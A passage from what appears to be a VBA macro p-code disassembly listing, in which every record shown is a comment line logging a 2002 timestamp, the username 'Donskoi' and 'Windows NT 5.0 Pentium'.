' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4720:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4721:
' Line #4722:
' Line #4723:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 16:11:28"
' Line #4724:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4725:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4726:
' Line #4727:
' Line #4728:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 16:11:44"
' Line #4729:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4730:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4731:
' Line #4732:
' Line #4733:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 16:12:40"
' Line #4734:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4735:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4736:
' Line #4737:
' Line #4738:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 16:13:36"
' Line #4739:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4740:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4741:
' Line #4742:
' Line #4743:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 16:15:21"
' Line #4744:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4745:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4746:
' Line #4747:
' Line #4748:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 16:16:44"
' Line #4749:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4750:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4751:
' Line #4752:
' Line #4753:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 16:17:34"
' Line #4754:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4755:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4756:
' Line #4757:
' Line #4758:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 16:23:32"
' Line #4759:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4760:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4761:
' Line #4762:
' Line #4763:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 16:23:41"
' Line #4764:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4765:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4766:
' Line #4767:
' Line #4768:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 16:25:04"
' Line #4769:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4770:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4771:
' Line #4772:
' Line #4773:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 16:32:51"
' Line #4774:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4775:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4776:
' Line #4777:
' Line #4778:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 16:34:36"
' Line #4779:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4780:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4781:
' Line #4782:
' Line #4783:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 16:36:34"
' Line #4784:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4785:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4786:
' Line #4787:
' Line #4788:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 16:38:17"
' Line #4789:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4790:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4791:
' Line #4792:
' Line #4793:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 16:41:17"
' Line #4794:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4795:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4796:
' Line #4797:
' Line #4798:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 17:16:20"
' Line #4799:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4800:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4801:
' Line #4802:
' Line #4803:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 17:18:29"
' Line #4804:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4805:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4806:
' Line #4807:
' Line #4808:
' 	QuoteRem 0x0000 0x0013 "16.02.2002 14:24:42"
' Line #4809:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4810:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4811:
' Line #4812:
' Line #4813:
' 	QuoteRem 0x0000 0x0013 "16.02.2002 14:25:42"
' Line #4814:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4815:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4816:
' Line #4817:
' Line #4818:
' 	QuoteRem 0x0000 0x0013 "16.02.2002 14:25:59"
' Line #4819:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4820:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4821:
' Line #4822:
' Line #4823:
' 	QuoteRem 0x0000 0x0013 "16.02.2002 14:26:19"
' Line #4824:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4825:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4826:
' Line #4827:
' Line #4828:
' 	QuoteRem 0x0000 0x0013 "16.02.2002 14:26:47"
' Line #4829:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4830:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4831:
' Line #4832:
' Line #4833:
' 	QuoteRem 0x0000 0x0013 "16.02.2002 14:27:04"
' Line #4834:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4835:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4836:
' Line #4837:
' Line #4838:
' 	QuoteRem 0x0000 0x0013 "16.02.2002 14:27:52"
' Line #4839:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4840:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4841:
' Line #4842:
' Line #4843:
' 	QuoteRem 0x0000 0x0013 "16.02.2002 14:28:55"
' Line #4844:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4845:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4846:
' Line #4847:
' Line #4848:
' 	QuoteRem 0x0000 0x0013 "16.02.2002 14:32:00"
' Line #4849:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4850:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4851:
' Line #4852:
' Line #4853:
' 	QuoteRem 0x0000 0x0013 "16.02.2002 14:32:08"
' Line #4854:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4855:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4856:
' Line #4857:
' Line #4858:
' 	QuoteRem 0x0000 0x0013 "16.02.2002 14:32:39"
' Line #4859:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4860:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4861:
' Line #4862:
' Line #4863:
' 	QuoteRem 0x0000 0x0013 "16.02.2002 14:33:16"
' Line #4864:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4865:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4866:
' Line #4867:
' Line #4868:
' 	QuoteRem 0x0000 0x0013 "16.02.2002 14:36:48"
' Line #4869:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4870:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4871:
' Line #4872:
' Line #4873:
' 	QuoteRem 0x0000 0x0013 "16.02.2002 16:44:37"
' Line #4874:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4875:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4876:
' Line #4877:
' Line #4878:
' 	QuoteRem 0x0000 0x0013 "16.02.2002 16:44:54"
' Line #4879:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4880:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4881:
' Line #4882:
' Line #4883:
' 	QuoteRem 0x0000 0x0013 "16.02.2002 16:45:45"
' Line #4884:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4885:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4886:
' Line #4887:
' Line #4888:
' 	QuoteRem 0x0000 0x0013 "16.02.2002 16:46:14"
' Line #4889:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4890:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4891:
' Line #4892:
' Line #4893:
' 	QuoteRem 0x0000 0x0013 "16.02.2002 16:48:12"
' Line #4894:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4895:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4896:
' Line #4897:
' Line #4898:
' 	QuoteRem 0x0000 0x0013 "16.02.2002 17:09:21"
' Line #4899:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4900:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4901:
' Line #4902:
' Line #4903:
' 	QuoteRem 0x0000 0x0013 "16.02.2002 17:26:52"
' Line #4904:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4905:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4906:
' Line #4907:
' Line #4908:
' 	QuoteRem 0x0000 0x0013 "16.02.2002 17:55:59"
' Line #4909:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4910:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4911:
' Line #4912:
' Line #4913:
' 	QuoteRem 0x0000 0x0013 "16.02.2002 21:09:20"
' Line #4914:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4915:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4916:
' Line #4917:
' Line #4918:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 2:11:05"
' Line #4919:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4920:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4921:
' Line #4922:
' Line #4923:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 2:31:24"
' Line #4924:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4925:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4926:
' Line #4927:
' Line #4928:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 2:36:52"
' Line #4929:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4930:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4931:
' Line #4932:
' Line #4933:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 2:38:11"
' Line #4934:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4935:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4936:
' Line #4937:
' Line #4938:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 3:10:02"
' Line #4939:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4940:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4941:
' Line #4942:
' Line #4943:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 3:21:59"
' Line #4944:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4945:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4946:
' Line #4947:
' Line #4948:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 3:35:11"
' Line #4949:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4950:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4951:
' Line #4952:
' Line #4953:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 3:42:28"
' Line #4954:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4955:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4956:
' Line #4957:
' Line #4958:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 5:52:45"
' Line #4959:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4960:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4961:
' Line #4962:
' Line #4963:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 5:53:23"
' Line #4964:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4965:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4966:
' Line #4967:
' Line #4968:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 5:53:25"
' Line #4969:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4970:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4971:
' Line #4972:
' Line #4973:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 5:55:04"
' Line #4974:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4975:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4976:
' Line #4977:
' Line #4978:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 5:59:07"
' Line #4979:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4980:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4981:
' Line #4982:
' Line #4983:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 6:26:06"
' Line #4984:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4985:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4986:
' Line #4987:
' Line #4988:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 6:34:49"
' Line #4989:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4990:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4991:
' Line #4992:
' Line #4993:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 6:35:28"
' Line #4994:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4995:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4996:
' Line #4997:
' Line #4998:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 6:48:12"
' Line #4999:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5000:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5001:
' Line #5002:
' Line #5003:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 6:48:36"
' Line #5004:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5005:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5006:
' Line #5007:
' Line #5008:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 6:49:08"
' Line #5009:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5010:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5011:
' Line #5012:
' Line #5013:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 6:49:26"
' Line #5014:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5015:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5016:
' Line #5017:
' Line #5018:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 6:53:33"
' Line #5019:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5020:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5021:
' Line #5022:
' Line #5023:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 6:53:50"
' Line #5024:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5025:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5026:
' Line #5027:
' Line #5028:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 6:54:06"
' Line #5029:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5030:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5031:
' Line #5032:
' Line #5033:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 6:54:23"
' Line #5034:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5035:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5036:
' Line #5037:
' Line #5038:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 6:55:00"
' Line #5039:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5040:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5041:
' Line #5042:
' Line #5043:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 6:55:02"
' Line #5044:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5045:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5046:
' Line #5047:
' Line #5048:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 7:01:48"
' Line #5049:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5050:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5051:
' Line #5052:
' Line #5053:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 9:44:50"
' Line #5054:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5055:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5056:
' Line #5057:
' Line #5058:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 9:51:16"
' Line #5059:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5060:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5061:
' Line #5062:
' Line #5063:
' 	QuoteRem 0x0000 0x0012 "17.02.2002 9:54:06"
' Line #5064:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5065:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5066:
' Line #5067:
' Line #5068:
' 	QuoteRem 0x0000 0x0013 "17.02.2002 11:58:18"
' Line #5069:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5070:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5071:
' Line #5072:
' Line #5073:
' 	QuoteRem 0x0000 0x0013 "17.02.2002 11:59:48"
' Line #5074:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5075:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5076:
' Line #5077:
' Line #5078:
' 	QuoteRem 0x0000 0x0013 "17.02.2002 12:00:02"
' Line #5079:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5080:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5081:
' Line #5082:
' Line #5083:
' 	QuoteRem 0x0000 0x0013 "17.02.2002 12:00:14"
' Line #5084:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5085:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5086:
' Line #5087:
' Line #5088:
' 	QuoteRem 0x0000 0x0013 "17.02.2002 12:01:26"
' Line #5089:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5090:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5091:
' Line #5092:
' Line #5093:
' 	QuoteRem 0x0000 0x0013 "17.02.2002 12:01:37"
' Line #5094:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5095:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5096:
' Line #5097:
' Line #5098:
' 	QuoteRem 0x0000 0x0013 "17.02.2002 12:03:59"
' Line #5099:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5100:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5101:
' Line #5102:
' Line #5103:
' 	QuoteRem 0x0000 0x0013 "17.02.2002 12:06:00"
' Line #5104:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5105:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5106:
' Line #5107:
' Line #5108:
' 	QuoteRem 0x0000 0x0013 "17.02.2002 12:14:32"
' Line #5109:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5110:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5111:
' Line #5112:
' Line #5113:
' 	QuoteRem 0x0000 0x0013 "17.02.2002 12:15:12"
' Line #5114:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5115:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5116:
' Line #5117:
' Line #5118:
' 	QuoteRem 0x0000 0x0013 "17.02.2002 12:15:13"
' Line #5119:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5120:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5121:
' Line #5122:
' Line #5123:
' 	QuoteRem 0x0000 0x0013 "17.02.2002 12:51:44"
' Line #5124:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5125:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5126:
' Line #5127:
' Line #5128:
' 	QuoteRem 0x0000 0x0013 "17.02.2002 13:51:23"
' Line #5129:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5130:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5131:
' Line #5132:
' Line #5133:
' 	QuoteRem 0x0000 0x0013 "17.02.2002 13:52:05"
' Line #5134:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5135:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5136:
' Line #5137:
' Line #5138:
' 	QuoteRem 0x0000 0x0013 "17.02.2002 13:52:41"
' Line #5139:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5140:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5141:
' Line #5142:
' Line #5143:
' 	QuoteRem 0x0000 0x0013 "17.02.2002 13:52:52"
' Line #5144:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5145:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5146:
' Line #5147:
' Line #5148:
' 	QuoteRem 0x0000 0x0013 "17.02.2002 13:52:59"
' Line #5149:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5150:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5151:
' Line #5152:
' Line #5153:
' 	QuoteRem 0x0000 0x0013 "17.02.2002 13:55:16"
' Line #5154:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5155:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5156:
' Line #5157:
' Line #5158:
' 	QuoteRem 0x0000 0x0013 "17.02.2002 13:55:24"
' Line #5159:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5160:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5161:
' Line #5162:
' Line #5163:
' 	QuoteRem 0x0000 0x0013 "17.02.2002 13:56:11"
' Line #5164:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5165:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5166:
' Line #5167:
' Line #5168:
' 	QuoteRem 0x0000 0x0013 "17.02.2002 17:20:18"
' Line #5169:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5170:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5171:
' Line #5172:
' Line #5173:
' 	QuoteRem 0x0000 0x0013 "17.02.2002 17:20:19"
' Line #5174:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5175:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5176:
' Line #5177:
' Line #5178:
' 	QuoteRem 0x0000 0x0013 "17.02.2002 21:40:58"
' Line #5179:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5180:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5181:
' Line #5182:
' Line #5183:
' 	QuoteRem 0x0000 0x0013 "17.02.2002 23:13:25"
' Line #5184:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5185:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5186:
' Line #5187:
' Line #5188:
' 	QuoteRem 0x0000 0x0013 "17.02.2002 23:16:28"
' Line #5189:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5190:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5191:
' Line #5192:
' Line #5193:
' 	QuoteRem 0x0000 0x0013 "17.02.2002 23:17:38"
' Line #5194:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5195:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5196:
' Line #5197:
' Line #5198:
' 	QuoteRem 0x0000 0x0013 "17.02.2002 23:28:23"
' Line #5199:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5200:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5201:
' Line #5202:
' Line #5203:
' 	QuoteRem 0x0000 0x0013 "17.02.2002 23:28:42"
' Line #5204:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5205:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5206:
' Line #5207:
' Line #5208:
' 	QuoteRem 0x0000 0x0013 "17.02.2002 23:29:05"
' Line #5209:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5210:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5211:
' Line #5212:
' Line #5213:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:07:49"
' Line #5214:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5215:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5216:
' Line #5217:
' Line #5218:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:08:48"
' Line #5219:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5220:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5221:
' Line #5222:
' Line #5223:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:22:21"
' Line #5224:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5225:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5226:
' Line #5227:
' Line #5228:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:23:18"
' Line #5229:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5230:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5231:
' Line #5232:
' Line #5233:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:25:17"
' Line #5234:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5235:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5236:
' Line #5237:
' Line #5238:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:25:19"
' Line #5239:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5240:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5241:
' Line #5242:
' Line #5243:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:26:26"
' Line #5244:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5245:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5246:
' Line #5247:
' Line #5248:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:26:28"
' Line #5249:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5250:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5251:
' Line #5252:
' Line #5253:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:27:30"
' Line #5254:
